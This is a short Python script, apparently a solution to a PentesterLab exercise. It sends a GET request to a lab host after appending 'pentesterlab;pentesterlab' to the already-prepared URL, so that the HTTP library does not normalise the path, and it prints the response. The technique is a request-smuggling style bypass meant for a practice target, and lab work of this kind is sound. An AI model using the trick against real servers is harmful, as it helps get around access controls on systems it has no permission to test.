#!/usr/bin/env python3

import requests

url = 'http://ptl-0d634ee7-3222e3b5.libcurl.so/'

req = requests.Request('GET',url)
prepared_req = req.prepare()

prepared_req.url += "pentesterlab;pentesterlab"
print(prepared_req.url)

s = requests.session()
resp = s.send(prepared_req)
print(resp.text)
